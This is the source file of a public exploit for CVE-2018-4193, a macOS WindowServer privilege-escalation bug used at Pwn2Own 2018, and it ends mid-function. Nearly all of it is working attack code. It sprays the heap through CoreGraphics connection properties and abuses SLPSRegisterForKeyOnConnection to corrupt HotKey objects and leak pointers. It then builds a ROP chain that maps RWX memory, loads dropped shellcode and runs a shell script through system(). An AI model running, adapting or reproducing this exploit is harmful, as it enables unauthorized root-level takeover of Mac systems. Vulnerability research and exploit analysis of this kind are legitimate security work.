// CVE-2018-4193 Exploit, by Ret2 Systems, Inc. (Pwn2Own 2018)
// compiled with: clang -framework Foundation -framework Cocoa eop.m -o eop

#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <Cocoa/Cocoa.h>
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>

#import "offsets.h"
#import "shellcode.h"

//
// Globals
//

int g_cid = 0;

uint32_t fast_probe[8192] = {};
uint32_t fast_flip[8192] = {};

int (*CGSSetHotKey)(int, int, int, int, int);
int (*CGSGetHotKey)(int, uint64_t, uint16_t *, uint16_t *, uint32_t *);
int (*CGSRemoveHotKey)(int, int);
int (*CGSSetHotKeyEnabled)(int, uint64_t, bool);

int (*CGSNewConnection)(int, int *);
int (*CGSReleaseConnection)(int);
int (*CGSGetConnectionPortById)(unsigned int);

int (*CGSSetConnectionProperty)(int, int, CFStringRef, CFTypeRef);
int (*CGSCopyConnectionProperty)(int, int, CFStringRef, CFTypeRef);
int (*SLPSRegisterForKeyOnConnection)(int, void *, unsigned int, bool);

//
// initialization
//

void resolve_symbols()
{

    //
    // resolve CoreGraphics exports
    //

    void *handle_CoreGraphics = dlopen("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", RTLD_GLOBAL | RTLD_NOW);

    // hotkeys
    CGSSetHotKey = dlsym(handle_CoreGraphics, "CGSSetHotKey");
    CGSGetHotKey = dlsym(handle_CoreGraphics, "CGSGetHotKey");
    CGSRemoveHotKey = dlsym(handle_CoreGraphics, "CGSRemoveHotKey");
    CGSSetHotKeyEnabled = dlsym(handle_CoreGraphics, "CGSSetHotKeyEnabled");

    // connections
    CGSNewConnection = dlsym(handle_CoreGraphics, "CGSNewConnection");
    CGSReleaseConnection = dlsym(handle_CoreGraphics, "CGSReleaseConnection");

    // connection properties
    CGSSetConnectionProperty = dlsym(handle_CoreGraphics, "CGSSetConnectionProperty");
    CGSCopyConnectionProperty = dlsym(handle_CoreGraphics, "CGSCopyConnectionProperty");
    dlclose(handle_CoreGraphics);

    //
    // resolve SkyLight exports
    //

    void *handle_SkyLight = dlopen("/System/Library/PrivateFrameworks/SkyLight.framework/SkyLight", RTLD_GLOBAL | RTLD_NOW);
    SLPSRegisterForKeyOnConnection = dlsym(handle_SkyLight, "SLPSRegisterForKeyOnConnection");
    dlclose(handle_SkyLight);

    //
    // resolve library bases (for ROP/COE)
    //

    uint64_t* bases = allocate_lib_bases();
    uint32_t count = _dyld_image_count();
    for (uint32_t i = 0; i < count; i++)
    {
        const char *name = _dyld_get_image_name(i);
        if (strstr(name, "SkyLight"))
            bases[SKYLIGHT] = (uint64_t)_dyld_get_image_header(i);
        if (strstr(name, "CoreGraphics"))
            bases[COREGRAPHICS] = (uint64_t)_dyld_get_image_header(i);
        if (strstr(name, "libsystem_c.dylib"))
            bases[LIBSYSTEM_C] = (uint64_t)_dyld_get_image_header(i);
        if (strstr(name, "libsystem_kernel.dylib"))
            bases[LIBSYSTEM_KERNEL] = (uint64_t)_dyld_get_image_header(i);
    }

    //
    // suggested starting position for chunk corrurption searches,
    // optimized based on testing / detereministic heap layout
    //

    fast_probe[1024] = 145000;
    fast_probe[1280] = 145000;
    fast_probe[1536] = 398000;
    fast_probe[1792] = 404000;
    fast_probe[2048] = 656000;
    fast_probe[2304] = 660000;
    fast_probe[2560] = 913000;
    fast_probe[2816] = 913000;
    fast_probe[3072] = 1160000;
    fast_probe[3328] = 1160000;
    fast_probe[3584] = 1420000;
    fast_probe[3840] = 1420000;
    fast_probe[4096] = 1690000;
    fast_probe[4352] = 1690000;
    fast_probe[4608] = 1950000;
    fast_probe[4864] = 1950000;

    fast_flip[1024] = 450000;
    fast_flip[1280] = 730000;
    fast_flip[1536] = 950000;
    fast_flip[1792] = 1200000;
    fast_flip[2048] = 1490000;
    fast_flip[2304] = 1780000;
    fast_flip[2560] = 2000000;
    fast_flip[2816] = 2260000;
    fast_flip[3072] = 2530000;
    fast_flip[3328] = 2850000;
    fast_flip[3584] = 3030000;
    fast_flip[3840] = 3300000;
    fast_flip[4096] = 3590000;
    fast_flip[4352] = 3870000;
    fast_flip[4608] = 4100000;
    fast_flip[4864] = 4310000;
}

bool pick_cid()
{
    int cid = 0;
    for(int i = 0; i < 0x1000; i++)
    {

        // establish a new connection to the WindowServer
        int result = CGSNewConnection(0, &cid);
        if(result == 1000) 
        {
            printf("[-] WindowServer not yet initialized... \n");
            break;
        }

        // try to pick a connection ID that ends in 0x13 ... for consistency
        int nibble = cid & 0xFF;
        if(nibble == 0x13)
        {
            g_cid = cid;
            return true;
        }

        // if the CID doesn't end in 0x13, release the connection and try again
        CGSReleaseConnection(cid);
    }
    return false;
}

//
// spraying
//

CFStringRef KEY_FORMAT = CFSTR("%01d_%09d");
CFStringRef KEY_FORMAT50 = CFSTR("%01d_%09d_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

// comes out to 0x3E0 bytes (max for MALLOC_TINY)
#define CORRUPTOR_SIZE  0x3C0+6

#define LEAK_SPRAY_COUNT  500000
#define LEAK_PROBE_START  0xFFEDFFC0  // approx ~400,000 keys into our spray
#define LEAK_LOCATE_START 350000

#define PROBE_COUNT        2
#define LEAK_PROBE_COUNT   PROBE_COUNT
#define HOTKEY_PROBE_COUNT PROBE_COUNT

#define LEAK_SPRAY_ID     0
#define HOTKEY_SPRAY_ID   1
#define KEY_SPRAY_ID      2
#define BOOKEND_SPRAY_ID  3
#define ARRAY_SPRAY_ID    4
#define PAD_SPRAY_ID      5

void spray(uint32_t start, uint32_t end, uint32_t spray_id, bool probeable, bool corruptable)
{

    //
    // prepare the largest possible object we can to spray into
    // the MALLOC_TINY heap buckets
    //

    char * corruptor_buffer = malloc(CORRUPTOR_SIZE);
    memset(corruptor_buffer, 0, CORRUPTOR_SIZE);
    char *fake_key = corruptor_buffer;

    // only allow a chunk to be safely 'probeable' if specified by the caller
    if(probeable)
        *((uint64_t*)&corruptor_buffer[CORRUPTOR_SIZE-6-8-24]) = 0x0000040000000000;

    // only allow forward chunk corruption if specified by the caller
    if(corruptable)
        *((uint64_t*)&corruptor_buffer[CORRUPTOR_SIZE-6-8]) = 0x0000040000000000;

    CFStringRef corruptor_cfs = CFStringCreateWithBytes(NULL, (UInt8*)corruptor_buffer, CORRUPTOR_SIZE, kCFStringEncodingISOLatin1, true);

    //
    // spray CFStrings into the WindowServer
    //

    for(int i = start; i < end; i++)
    {
        CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, spray_id, i);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, corruptor_cfs);
        CFRelease(key_name);
        if(i % 1000000 == 0 && i) { printf("[*] - Completed %u\n", i); }
    }

    CFRelease(corruptor_cfs);
    free(corruptor_buffer);
}

//
// probing
//

#define EXPECTED_DISTANCE 0x80

unsigned int write_probes(uint32_t * probe_indexes, uint32_t starting_index, uint32_t length, uint32_t expected)
{
    ProcessSerialNumber psn;
    psn.highLongOfPSN = 1;
    psn.lowLongOfPSN = getpid();

    int result = 0;
    uint32_t written = 0;
    uint32_t distance = 0;
    uint32_t current_index = 0;
    uint32_t previous_index = 0;

    for(int i = 0; i < 8192*20 && written < length; i++)
    {
        current_index = starting_index + i;
        result = SLPSRegisterForKeyOnConnection(g_cid, &psn, current_index, 1);
        //printf("[*] Attempted buggy write @ 0x%08X: %u\n", current_index, result);

        // a non-zero return code means the write did not occur
        if(result)
            continue;

        //
        // skip indexing forward 0x300 bytes (0x60 * 8 == 0x300)
        //

        i += 0x60;

        //
        // if this is the first valid probe index, we save it and continue
        // until we can validate its distance to the next valid probe.
        //

        if(previous_index == 0)
        {
            previous_index = current_index;
            continue;
        }

        //
        // compute the distance between this probe, and the last one. due to
        // our groom/spray, we expect this to be 0x80. if this is not the case,
        // we got unlucky with our spray / heap state (unlikely).
        //

        distance = current_index - previous_index;
        if(distance != expected)
        {
            //printf("[!] - Unexpected distance! Expected 0x%X, got 0x%X)\n", expected, distance);

            // clear the probe from the previous index...
            result = SLPSRegisterForKeyOnConnection(g_cid, &psn, previous_index, 0);

            // save this index and continue probing forward
            previous_index = current_index;
            continue;
        }

        //
        // We have confirmed that the distance between our probes seems correct...
        // save this as a valid probe index for use in future corruption.
        //

        printf("[*] - probe_indexes[%u] = 0x%08X\n", written, previous_index);
        probe_indexes[written++] = previous_index;
        previous_index = 0;
    }

    return written;
}


unsigned int locate_leak(uint32_t start, uint32_t end, uint32_t * keys, unsigned int length, uint64_t * leaked)
{
    CFIndex got;
    CFTypeRef valuePtr;
    CFRange range = CFRangeMake(0, CORRUPTOR_SIZE);
    char key_value[CORRUPTOR_SIZE] = {};

    //
    // assuming the write happened, we expect to find a random pointer
    // sitting in the middle of one of the strings ('property values')
    // that we sprayed in the windowserver.
    //
    // loop through the sprayed properties, and inspect their contents,
    // looking for the leaked pointer
    //

    uint32_t found = 0;
    uint64_t * leak = 0;

    for(int i = start; i < end && found < length; i++)
    {

        // request a named connection property back from the windowserver
        CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, LEAK_SPRAY_ID, i);
        CGSCopyConnectionProperty(g_cid, g_cid, key_name, &valuePtr);
        CFRelease(key_name);

        // convert the received string to raw bytes
        CFStringGetBytes(valuePtr, range, kCFStringEncodingISOLatin1, 0, true, (UInt8*)key_value, CORRUPTOR_SIZE, &got);
        CFRelease(valuePtr);

        // check for the presence of a leak
        leak = ((uint64_t*)&key_value[CORRUPTOR_SIZE-6-24]);
        if(*leak != 0)
        {
            *leaked = *leak;
            keys[found++] = (uint32_t)i;
        }
    }

    return found;
}

//
// HotKeys
//

unsigned int locate_hotkey_probes(uint32_t start, uint32_t end, uint32_t * keys, unsigned int length)
{
    CFIndex got;
    CFTypeRef valuePtr;
    CFRange range = CFRangeMake(0, CORRUPTOR_SIZE);
    char key_value[CORRUPTOR_SIZE] = {};

    uint32_t found = 0;
    uint64_t * leak = 0;

    for(int i = start; i < end && found < length; i++)
    {

        // Request the a key's value from the windowserver
        CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, i);
        CGSCopyConnectionProperty(g_cid, g_cid, key_name, &valuePtr);
        CFRelease(key_name);

        // convert from string to raw bytes and configure search settings accordingly
        CFStringGetBytes(valuePtr, range, kCFStringEncodingISOLatin1, 0, true, (UInt8*)key_value, CORRUPTOR_SIZE, &got);
        CFRelease(valuePtr);

        leak = ((uint64_t*)&key_value[CORRUPTOR_SIZE-6-24]);
        if(*leak != 0)
            keys[found++] = (uint32_t)i;
    }

    return found;
}

void punch_hotkey_holes(unsigned int * hotkey_keys, size_t length)
{
    for(int i = 0; i < length; i++)
    {
        // we want to punch a hole AFTER the string we probed (hence +1)
        int hole_index = hotkey_keys[i] + 1;
        CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, hole_index);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
        CFRelease(key_name);
    }
}

void create_hotkeys()
{
    for(int i = 1; i < 0x4000; i++)
        CGSSetHotKey(g_cid, i, 0x4242, 0x4343, 0xBE0000);
}

    

int corrupt_hotkeys(unsigned int * probe_indexes, size_t length)
{
    ProcessSerialNumber psn;
    psn.highLongOfPSN = 1;
    psn.lowLongOfPSN = getpid();
    int corrupted = 0;

    for(int i = 0; i < length; i++)
    {

        //
        // the buggy index capable of causing the partial overwrite corruption will be
        // one after the 'probed' index. this is because we create two 'hook' in the
        // corruptable strings we sprayed
        //

        unsigned int corruption_index = probe_indexes[i] + 1;

        // use our vulnerability to attempt the cross-chunk corruption
        int result = SLPSRegisterForKeyOnConnection(g_cid, &psn, probe_indexes[i]+1, 1);
        if(result != 0)
            printf("[!] Corruption was non-zero??? Invalid probe index? %u\n", result);
            
        //
        // assuming we corrupted a HotKey, its hotkey->next pointer is now hopefully
        // pointing somewhere into the second half of the string spray. the data at
        // this location should be mostly NULL bytes (what we were spraying), so the
        // 'dangling' HotKey at this location is likely to have a HotKey ID of 0.
        //
        // using the SkyLight/CG APIs, let's try to enable HotKey 0. if this succeeds,
        // that means the HotKey does indeed exist (successful corruption) and there
        // should be a single bit flipped somewhere in spray 2/2. 
        //

        result = CGSSetHotKeyEnabled(g_cid, 0, false);

        //
        // a non-zero result means that we got unlucky, and the dangling HotKey pointer
        // probably points within the header of a sprayed CFString, or a property key
        // string. this means the hotkey->next pointer was probably some random data that
        // the WindowServer tried to follow (as a pointer) thus segfaulting the process.
        // 
        // this means game over...
        //

        if(result == -308)
        {
            printf("[-] FAILURE: WindowServer crashed because the HotKey landed on non-zero data\n");
            return 0;
        }

        corrupted++;

        //
        // we 'enabled' a HotKey object that should not exist (id 0). this means our
        // cross chunk corruption was successful, and we have a dangling HotKey object
        // 

        if(result == 0)
            break;

        //
        // finally, if neither of the above cases caught, we probably corrupted
        // something we shouldn't have, eg a hotkey did not fall in the holes we
        // created. oops, this doesn't look good.
        //

        printf("[!] Possible mis-corruption (%u), WindowServer may now be unstable!\n", result);
    }
    return corrupted;
}

bool locate_hotkey(uint32_t start, uint32_t end, uint32_t * key_index, uint32_t * offset)
{
    CFIndex got;
    CFTypeRef valuePtr;
    CFRange range = CFRangeMake(0, CORRUPTOR_SIZE);
    char key_value[CORRUPTOR_SIZE+8] = {};
 
    // 
    // the bitflip should almost always land in the last 256mb-512mb of our
    // spray. we scan backwards through our sprayed strings until we find it.
    //

    for(int i = end-1; i > start; i--)
    {

        // Request the a key's value from the windowserver
        CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, i);
        CGSCopyConnectionProperty(g_cid, g_cid, key_name, &valuePtr);
        CFRelease(key_name);

        // convert from string to raw bytes and configure search settings accordingly
        CFStringGetBytes(valuePtr, range, kCFStringEncodingISOLatin1, 0, true, (UInt8*)key_value, CORRUPTOR_SIZE, &got);
        CFRelease(valuePtr);

        uint32_t j = 0;
        uint32_t * leak = (uint32_t*)&key_value;
        while(j < CORRUPTOR_SIZE)
        {
            if(*leak == 0x01000000)
            {
                *key_index = (uint32_t)i;
                *offset = j;
                return true;
            }

            leak++;
            j+=4;
        }
    }
    return false;
}

//
// final (array) groom
//

#define GROOM_SUCCESS    0
#define GROOM_MORE       1
#define GROOM_MISALIGNED 2

void groom_array(CFArrayRef rop_array, uint32_t key_index, uint32_t offset, uint32_t prev_chunks)
{
    CFStringRef key_name;
    CFStringRef key_value; 
    CFStringRef rop_str = CFArrayGetValueAtIndex(rop_array, 0);
  
    // 
    // Create holes for ROP 
    //
    
    for(int i = 0; i < 10000; i++)
    {
        key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, PAD_SPRAY_ID, i);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, rop_str);
        CFRelease(key_name);
    }
    for(int i = 1; i < 10000; i+=2)
    {
        key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, PAD_SPRAY_ID, i);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
        CFRelease(key_name);
    }

    //
    // since placing this final heap chunk is so critical, we are going to create some
    // holes in the heap to account for the connection property keys that will get
    // allocated while spraying the large ROP arrays. this will hopefully trap those
    // keys, and improve the reliability of us placing our CFMutableArrays correctly.
    //
   
    for(int i = 0; i < 60000; i++) // create keys
    {
        key_name  = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, KEY_SPRAY_ID, i);
        key_value = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT50, KEY_SPRAY_ID, i);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, key_value);
        CFRelease(key_name);
        CFRelease(key_value);
    }
    for(int i = 0; i < 60000; i+=2) // punch key holes
    {
        key_name  = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, KEY_SPRAY_ID, i);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
        CFRelease(key_name);
    }
    
    for(int i = 0; i < 3000; i++)
    {
        key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, ARRAY_SPRAY_ID, i);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, rop_array);
        CFRelease(key_name);
    }
    
    // punch a few holes *after* the target key/value (some runway)
    key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, key_index+3);
    CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
    key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, key_index+2);
    CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
    key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, key_index+1);
    CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
   
    // punch a hole *at* the target key/value where the dangling HotKey falls within
    key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, key_index);
    CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
   
    // punch a variable number of holes before the key/value (for groom/spray alignment)
    for(int i = 0; i < prev_chunks; i++)
    {
        key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, HOTKEY_SPRAY_ID, key_index-(i+1));
        CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
    }
   
    // finally, spray our ROP arrays arrays and hope for the best
    for(int i = 3000; i < 8000; i++)
    {
        key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT50, ARRAY_SPRAY_ID, i);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, rop_array);
        CFRelease(key_name);
    }
}

uint32_t evaluate_groom(uint64_t * hotkey_id, uint64_t * big_heap_leak)
{
    int result = 0;
    uint16_t leak1 = 0;
    uint16_t leak2 = 0;
    uint32_t leak3 = 0;
    uint64_t bf_hotkey_id = 0;

    //
    // assuming the array groom worked the way we expected, there should
    // now be a CFMutableArray allocated under our 'dangling' hotkey.
    //
    // if the spray aligned correctly, the 'hotkey id' for our 'dangling'
    // hotkey will overlap with the bottom 3 bytes of a MALLOC_LARGE pointer.
    //
    // the 'next' hotkey pointer field will overlap with part of the
    // CFMutableArray internal structure (mutations?) and will be NULL. 
    //
    // this means we can bruteforce our new 'hotkey id' (technically only 
    // a 3 NIBBLE bruteforce without fear of crashing / failure.
    //

    for(uint64_t i = 0; i < 0x1000; i++)
    {
        bf_hotkey_id = i << 52;
        result = CGSGetHotKey(g_cid, bf_hotkey_id, &leak1, &leak2, &leak3);
        if(result == 0)
        {
            printf("[+] Found overlaid hotkey id 0x%llx\n", bf_hotkey_id);
            *hotkey_id = bf_hotkey_id;
            break;
        }
    }

    //printf("leak1: 0x%04X\n", leak1);
    //printf("leak2: 0x%04X\n", leak2);
    //printf("leak3: 0x%08X\n", leak3);

    // check for abnormal conditions indicating a groom failure
    if(leak1 == 0)
    {
        if(leak3 == 0)
        {
            printf("[!] abnormal groom. try spraying more arrays...\n");
            return GROOM_MORE; 
        }
        printf("[!] abnormal groom. likely mis-aligned...\n");
        return GROOM_MISALIGNED;
    }

    //
    // oh boy, our groom appears to have worked. this means we
    // should also now have a pointer to the big heap (MALLOC_LARGE)
    // which leaked through the hotkey overlapping an array
    //
    // we only use this leak to determine whether we should flip
    // the bit in an string pointer one way or another.
    //
    
    *big_heap_leak = (((uint64_t)leak1 << 24) | leak3 >> 8);
    
    return GROOM_SUCCESS;
}

bool corrupt_cf_ptr(uint64_t hotkey_id, uint64_t big_heap_leak)
{

    //
    // flip a single bit (0x00000001000000) in a CFStringRef pointer
    // laid beneath our 'dangling' hotkey
    //

    bool flip = (big_heap_leak & 0x1000000) == 0x1000000;
    printf("[*] Corrupting %p --> %p...\n", (void*)big_heap_leak, (void*)(big_heap_leak ^ 0x1000000));
    return CGSSetHotKeyEnabled(g_cid, hotkey_id, flip) == 0;
}

//
// ROP + shellcode
//

#define SHELLCODE_MAP_SIZE 0x4000

char sc_name[16] = {0};

void drop_shellcode()
{
    long long init_time = time(0);

    snprintf(sc_name, sizeof(sc_name)-1, "/cores/%08llx", init_time << 4);
    int fd = open(sc_name, O_RDWR|O_CREAT, 0777);
    char * shellcode_page = malloc(SHELLCODE_MAP_SIZE);
    memset(shellcode_page, 0xCC, SHELLCODE_MAP_SIZE);
    memcpy(shellcode_page, shellcode, shellcode_len);

    //
    // Resolve symbols required by shellcode
    //
    
    uint64_t _CGXConnectionForConnectionID   = get_offset("_CGXConnectionForConnectionID");
    uint64_t _get_default_connection_tls_key = get_offset("_get_default_connection_tls_key"); // ? not sure
    uint64_t _SLXServer_loop                 = get_offset("_SLXServer_loop");
    
    void* h = dlopen("/usr/lib/libobjc.A.dylib",1);
    void* objc_rel = dlsym(h,"objc_release");
    dlclose(h);

    uint64_t reloc = (uint64_t)(objc_rel+get_offset("objc_release_offset"));
    uint64_t sel_release = *(uint32_t*)(reloc+3)+reloc+7;

    //
    // Populate pseudo DATA section @ 0x3F00
    //   0x3F00: [shellcode pointer]
    //   0x3F08: [ConnectionID]
    //   0x3F10: [CGXConnectionForConnectionID]
    //   0x3F18: [_get_default_connection_tls_key_key]
    //   0x3F20: [SLXServer Loop]
    //   0x3F28: [SEL_release]
    //

    uint64_t * data_section = (uint64_t*)(&shellcode_page[0x3F00]);
    data_section[0] = 0;     // populated by the shellcode at runtime
    data_section[1] = g_cid;
    data_section[2] = _CGXConnectionForConnectionID;
    data_section[3] = _get_default_connection_tls_key;
    data_section[4] = _SLXServer_loop;
    data_section[5] = sel_release;

    // write shellcode to /cores/root.so
    write(fd, shellcode_page, SHELLCODE_MAP_SIZE);

    // cleanup
    close(fd);
    free(shellcode_page);

    printf("[*] Wrote shellcode to %s\n", sc_name);
}

void build_arb_rop(uint64_t* ptr)
{
    int i = 0;
    // TODO XXX FIXME this is not valid or safe, but happens to work for now
    char* data = (char*)0x210000e00;

    //
    // function pointers
    //

    uint64_t _open = get_offset("_open");
    uint64_t _mmap = get_offset("_mmap");
    uint64_t _read = get_offset("_read");

    //
    // Libsystem_c Gadgets
    //

    uint64_t pop_rcx        = get_offset("pop rcx; ret");
    uint64_t mov_rax_rcx    = get_offset("mov rax, rcx; ret");
    uint64_t mov_ptrrax_rcx = get_offset("mov [rax], rcx; ret");
    uint64_t pop_rdi        = get_offset("pop rdi; pop rbp; ret");
    uint64_t pop_rdx        = get_offset("pop rdx; mov eax, 1; ret");
    uint64_t pop_rsi        = get_offset("pop rsi; pop rbp; ret");
    uint64_t pop_r8         = get_offset("pop r8; mov rax, r8; ret");
    uint64_t pop_r15        = get_offset("pop r15; pop rbp; ret");
    
    //
    // SkyLight Gadgets
    //

    uint64_t xor_r9_call_r15 = get_offset("xor r9d, r9d; call r15");
    uint64_t add_rsp_10      = get_offset("add rsp, 0x10; pop rbp; ret");
    uint64_t jmp_rax         = get_offset("jmp rax");
    uint64_t mov_rdi_rax     = get_offset("mov rdi, rax; call r15");
    uint64_t mov_rax_rsi     = get_offset("mov rax, rsi; pop rbp; ret");
    uint64_t mov_rsi_ptrr15  = get_offset("mov rsi, [r15]; call r14");
    uint64_t pop_r14         = get_offset("pop r14; pop rbp; ret");
    uint64_t mov_ptrrcx_rax  = get_offset("mov [rcx], rax; pop rbp; ret");

    //
    // macOS 10.13.3 ROP chain
    //
    //   mmap/open/read --> shellcode
    //

    ptr[i++] = pop_rcx+1;

    ptr[i++] = get_offset("pop rdi; pop rbp; ret");
    ptr[i++] = (uint64_t)0x210000e00;
    ptr[i++] = 0;
    ptr[i++] = get_offset("system");
    
    // 
    // mmap RWX page
    //

    // set rdi to 0 (mmap address)
    ptr[i++] = pop_rdi;
    ptr[i++] = 0x0;
    ptr[i++] = 0x4141414141414141;

    // set rsi (mmap size)
    ptr[i++] = pop_rsi;
    ptr[i++] = 0x4000;
    ptr[i++] = 0x4141414141414141;
    
    // clear r9 (offset)
    ptr[i++] = pop_r15;
    ptr[i++] = add_rsp_10;
    ptr[i++] = 0x4141414141414141;

    ptr[i++] = xor_r9_call_r15;
    ptr[i++] = 0x4242424242424242;
    ptr[i++] = 0x4242424242424242;

    // set rdx (permissions)
    ptr[i++] = pop_rdx;
    ptr[i++] = 0x7;

    // set rcx (flags, MAP_ANON | MAP_PRIVATE)
    ptr[i++] = pop_rcx;
    ptr[i++] = 0x1002;

    // set r8 (file descriptor; doesnt apply to us)
    ptr[i++] = pop_r8;
    ptr[i++] = 0x0;

    // call mmap(...)
    ptr[i++] = _mmap;

    // save RWX address we got back
    ptr[i++] = pop_rcx;
    ptr[i++] = (uint64_t)(data + 128);
    ptr[i++] = mov_ptrrcx_rax;
    ptr[i++] = 0x4141414141414141;

    //
    // open("/cores/root.so", O_RDONLY)
    //

    // set rdi (filename)
    ptr[i++] = pop_rdi;
    ptr[i++] = 0x210000f00;
    ptr[i++] = 0x4141414141414141;

    // set rsi (flags, O_RDONLY)
    ptr[i++] = pop_rsi;
    ptr[i++] = 0x0;
    ptr[i++] = 0x4141414141414141;

    // call open
    ptr[i++] = _open;

    //
    // read the shellcode file into our rwx page
    //

    // move our fd (rax) into rdi
    ptr[i++] = pop_r15;
    ptr[i++] = add_rsp_10;
    ptr[i++] = 0x4141414141414141;

    ptr[i++] = mov_rdi_rax;
    ptr[i++] = 0x4242424242424242;
    ptr[i++] = 0x4242424242424242;

    // retrieve the address of our rwx page and put it into rsi
    ptr[i++] = pop_r14;
    ptr[i++] = add_rsp_10;
    ptr[i++] = 0x4141414141414141;

    ptr[i++] = pop_r15;
    ptr[i++] = (uint64_t)(data+128);
    ptr[i++] = 0x4141414141414141;

    ptr[i++] = mov_rsi_ptrr15;
    ptr[i++] = 0x4242424242424242;
    ptr[i++] = 0x4242424242424242;

    // set rdx (size of read);
    ptr[i++] = pop_rdx;
    ptr[i++] = 0x4000;

    // call read(...)
    ptr[i++] = _read;

    //
    // jump to our shellcode, rsi survives the read call
    //

    ptr[i++] = mov_rax_rsi;
    ptr[i++] = 0x4141414141414141;
    ptr[i++] = jmp_rax;

    // eof
    ptr[i++] = 0x4343434343434343;

}

#define ROP_SPRAY_SIZE 0x28000-0x18-2
#define ROP_PADDED_SIZE (ROP_SPRAY_SIZE & 0xFFFFFFFFFFFFF000) + 0x2000

void build_rop_chain(void * ptr, size_t length)
{
    uint16_t * rop_chain16;
    uint64_t * rop_chain64;
    
    //
    // c.f. http://phrack.org/issues/69/9.html
    //
    
    char* cmd = "(sh /cores/p.sh &) &\0\0\0\0\0\0\0";
    void * release_ptr = NSSelectorFromString(@"release");

    for(int i = 0; i < length; i+= 0x1000)
    {

        //  
        // get the current location in the buffer as a uint64_t *
        // for easier construction of the rop chain
        //

        rop_chain64 = (uint64_t*)&ptr[i];

        //
        // fake Objective CStringRef header (eg. address 0x210000000)
        //

        rop_chain64[0] = 0x210000100;            // fake ISA ptr to rop_chain64[i+0x20]
        rop_chain64[1] = 0;                      // flags

        //
        // second pivot
        //
        //   pop rax
        //   add al, 0x00
        //   add byte [rbx+0x41], bl 
        //   pop rsp
        //   pop r13
        //   pop r14
        //   pop r15
        //   pop rbp
        //   ret
        //

        rop_chain64[2] = get_offset("god pivot 2");
        rop_chain64[3] = 0x4444444444444444;

        //
        // third pivot
        //

        rop_chain64[4] = get_offset("pop rsp; ret");
        rop_chain64[5] = 0x210000180;
        rop_chain64[6] = 0x4747474747474747;

        //
        // fake ISA (eg. address 0x208000100)
        //
        
        rop_chain64[0x20] = 0;
        rop_chain64[0x21] = 0;               
        rop_chain64[0x22] = 0x210000128;            // ptr to rop_chain64[i+0x25]
        rop_chain64[0x23] = 0;                      // Mask
        rop_chain64[0x24] = 0;                      // Flags
        rop_chain64[0x25] = (uint64_t)release_ptr;  // pointer to objective c 'release'
        //rop_chain64[0x26] = 0x414141414141;         // RIP, hijacks control flow

        //
        // first pivot
        //
        //   push rdi ; 
        //   adc byte [rax-0x75], cl
        //   cmp edi, dword [rsi+0x4]
        //   xor edx, edx
        //   call qword [rdi+0x10] 
        //

        rop_chain64[0x26] = get_offset("god pivot 1");

        build_arb_rop(&rop_chain64[0x30]);

        strcpy(&rop_chain64[0xe00/8], cmd);
        strcpy(&rop_chain64[0xf00/8], sc_name);

    }
  
    // 
    // encode ropchain as utf16 so we can spray it as a string
    //

    rop_chain16 = (uint16_t*)&ptr[0];
    for(int i = 0; i < length/2; i++)
        rop_chain16[i] = (rop_chain16[i] >> 8) | (rop_chain16[i] << 8);

}

CFArrayRef build_rop_array(uint32_t offset, uint32_t * spray_size, uint32_t * prev_chunks)
{
    //
    // Create the array we would like to try and swap in under the hotkey
    //

    char * rop_buffer = malloc(ROP_PADDED_SIZE);
    memset(rop_buffer, 0x50, ROP_PADDED_SIZE);
    build_rop_chain(rop_buffer, ROP_PADDED_SIZE);

    CFStringRef rop_str = CFStringCreateWithBytes(NULL, (UInt8*)&rop_buffer[0x18], ROP_SPRAY_SIZE, kCFStringEncodingUTF16, true); 
    
    uint32_t min_buffer = 0x4343;
    CFStringRef little_str = CFStringCreateWithBytes(NULL, (UInt8*)&min_buffer, 3, kCFStringEncodingISOLatin1, true); 

    CFStringRef strs[0x200];
    for(int j = 0; j < 0x200; j++)
        strs[j] = little_str;

    strs[0] = rop_str;
    strs[2] = rop_str;
    strs[4] = rop_str;
    //strs[5] = rop_str;
    //strs[6] = rop_str;
    strs[7] = rop_str;
    strs[8] = rop_str;

    //
    // Compute metrics to ensure best odds of alignment...
    //

    for(int i = 0; i < 0x10; i++)
    {
        uint32_t array_offset = offset - 0x40 + 0x18 + 0x20 + 0x400*i;
        for(int j = 0x80; j < 0x200; j += 0x10)
        {
            if(array_offset % j == 0)
            {
                *spray_size = j;
                *prev_chunks = i;
                break;
            }
        }
        if(*spray_size)
            break;
    }

